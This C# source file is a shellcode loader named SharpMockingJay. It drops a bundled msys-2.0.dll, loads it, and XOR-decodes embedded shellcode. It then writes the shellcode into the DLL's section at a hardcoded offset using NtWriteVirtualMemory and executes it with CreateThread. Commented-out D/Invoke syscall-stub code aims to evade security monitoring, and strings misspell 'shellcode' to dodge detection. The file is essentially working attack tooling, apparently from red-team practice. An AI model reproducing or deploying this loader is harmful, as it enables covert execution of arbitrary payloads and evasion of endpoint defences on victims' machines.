
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Diagnostics;
//using DInvoke.Data;
//using static DInvoke.Data.Native;
using System.Text;

namespace SharpMockingJay
{
    public static class Program
    {
        #region P/Invokes
        
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string dllName);

        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("ntdll.dll", SetLastError = true)] //we are going to try to use this instead of WriteProcessMemory
        static extern IntPtr NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, UInt32 NumberOfBytesToWrite, ref UInt32 NumberOfBytesWritten);
        #endregion

        #region D/Invokes ?
        //[UnmanagedFunctionPointer(CallingConvention.StdCall)]
        //public delegate Native.NTSTATUS NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, IntPtr buffer, uint bufferLength, ref uint bytesWritten);

        //[UnmanagedFunctionPointer(CallingConvention.StdCall)]
        //public delegate Native.NTSTATUS NtCreateThreadEx(out IntPtr threadHandle, Win32.WinNT.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);

        //public enum State
        //{
        //    MEM_COMMIT = 0x00001000,
        //    MEM_RESERVE = 0x00002000
        //}

        //public enum Protection
        //{
        //    PAGE_EXECUTE_READWRITE = 0x40,
        //    PAGE_EXECUTE = 0x10,
        //    PAGE_EXECUTE_READ = 0x20,
        //    PAGE_READWRITE = 0x04
        //}
        //public enum ProcessAccess
        //{
        //    PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF,
        //    PROCESS_CREATE_THREAD = 0x0002,
        //    PROCESS_QUERY_INFORMATION = 0x0400,
        //    PROCESS_VM_OPERATION = 0x0008,
        //    PROCESS_VM_READ = 0x0010,
        //    PROCESS_VM_WRITE = 0x0020
        //}
        #endregion

        #region GZIP
        //https://www.dotnetperls.com/decompress
        static byte[] Decompress(byte[] gzip)
        {
            // Create a GZIP stream with decompression mode.
            // ... Then create a buffer and write into while reading from the GZIP stream.
            using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
            {
                const int size = 4096;
                byte[] buffer = new byte[size];
                using (MemoryStream memory = new MemoryStream())
                {
                    int count = 0;
                    do
                    {
                        count = stream.Read(buffer, 0, size);
                        if (count > 0)
                        {
                            memory.Write(buffer, 0, count);
                        }
                    }
                    while (count > 0);
                    return memory.ToArray();
                }
            }
        }

        #if DEBUG
        //compression helper routine. Will remove from #release versions
        public static byte[] Compress(byte[] raw)
        {
            using (MemoryStream memory = new MemoryStream())
            {
                using (GZipStream gzip = new GZipStream(memory, CompressionMode.Compress, true))
                {
                    gzip.Write(raw, 0, raw.Length);
                }
                return memory.ToArray();
            }
        }
        #endif
#endregion

        #if DEBUG
        private static string byteA_formatter(byte[] raw)
        {
            StringBuilder sb = new StringBuilder();
            sb.Append("using System;\nnamespace SharpMockingJay\n{\n\tpublic class compressed\n\t{\n\t\tpublic static byte[] dll = {\n\t\t\t");
            for(int i=0;i < raw.Length; i++)
            {
                sb.Append("0x" + ((int)raw[i]).ToString("X2"));
                if (i < raw.Length-1)
                {
                    sb.Append(", ");
                    if (i != 0 && i % 32 == 0)
                    {
                        sb.Append("\n\t\t\t");
                    }
                }
            }
            sb.Append(" \n\t\t\t};\n\t}\n}");
            return sb.ToString();
        }
        #endif
        private static List<byte> xorro (byte[] raw, byte[] key)
        {
            List<byte> outList = new List<byte>();
            for(int i=0; i < raw.Length; i++)
            {
                outList.Add((byte)((int)raw[i] ^ (int)key[i % key.Length]));
            }
            return outList;
        }

        public static void Constructor()
        {
            //default Constructor
        }

        public static void Main(string[] args)
        {
            try
            {
                UInt64 offset = 0x1EC000; //Hardcoded because we know this, thanks to PE BEAR. Later revisions I plan on adding the lookup routines so other DLLs can be used.
                byte[] cb; 
#if DEBUG
                Console.WriteLine("[!] Debug enabled, printing debug statements and enabling Compression function!");
                if (args.Length > 0)
                {
                    switch (args[0])
                    {
                        case "-c":
                            try
                            {
                                byte[] fb = File.ReadAllBytes(args[1]);
                                cb = Compress(fb);
                                Console.WriteLine("[!] Compression complete!\n Orig:\t{0} B\n Comp:\t{1} B", fb.Length, cb.Length);

                                File.WriteAllText("compressed.cs", byteA_formatter(cb));
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[-] Compression error:\n  {0}\n  {1}", e.Message, e.StackTrace);
                            }
                            break;
                        default:
                            break;
                    }
                }
#endif

                //TODO
                File.WriteAllBytes("msys-2.0.dll", Decompress(compressed.dll));
                // write msys-2.0.dll to local folder

                //load msys DLL
                IntPtr baseAddr = LoadLibrary(".\\msys-2.0.dll");    //it is now loaded in memory space. Is it at 0x21040000 as expected?
                UInt64 injAddr = (UInt64)baseAddr + offset;
#if DEBUG
                Console.WriteLine("[+] Base Address: {0}", baseAddr.ToString("X"));
                Console.WriteLine("[+] Inj Address: {0}", injAddr.ToString("X"));
#endif
                List<byte> holdshc = xorro(shc.shlc, shc.key);
                uint bytesWritten = 0;
                IntPtr procHandle = Process.GetCurrentProcess().Handle;

                #region P/Invoke
                NtWriteVirtualMemory(procHandle, (IntPtr)injAddr, holdshc.ToArray(), (uint)holdshc.Count, ref bytesWritten);
#if DEBUG
                Console.WriteLine("[!] MOAR CHEEEEZBURGERS!!!\n(your shllcde should launch now)");
#endif
                IntPtr hThread = CreateThread((IntPtr)0, 0, (IntPtr)injAddr, (IntPtr)0, 0, (IntPtr)0);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
                #endregion

                #region D/Invoke
                //IntPtr syscall = IntPtr.Zero;
                //syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
                //NtWriteVirtualMemory NtWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(syscall, typeof(NtWriteVirtualMemory));
                //var buf = Marshal.AllocHGlobal(holdshc.Count);
                //Marshal.Copy(holdshc.ToArray(), 0, buf, holdshc.Count);
                //Native.NTSTATUS status = NtWriteVirtualMemory(procHandle, (IntPtr)injAddr, buf, (uint)holdshc.Count, ref bytesWritten);

                //if (status == Native.NTSTATUS.Success)
                //{
                //    Console.WriteLine($"[*] Wrote shllcde into the memory. Bytes written: {bytesWritten}");
                //}
                //else
                //{
                //    Console.WriteLine($"[-] Error writing shllcde.");
                //}

                //syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtCreateThreadEx");
                //NtCreateThreadEx NtCreateThreadEx = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(syscall, typeof(NtCreateThreadEx));
                //IntPtr hThread = IntPtr.Zero;
                //status = NtCreateThreadEx(out hThread, Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, procHandle, (IntPtr)injAddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
                //if (status == Native.NTSTATUS.Success)
                //{
                //    Console.WriteLine($"[*] Exec shllcde from memory. {hThread}");
                //}
                //else
                //{
                //    Console.WriteLine($"[-] Error executing shllcde.");
                //}
                #endregion
            }
            catch (Exception e)
            {
                System.Diagnostics.Debug.WriteLine("[-] Exception caught:\n{0}\n{1}", e.Message, e.StackTrace);
            }
        }
    }
}
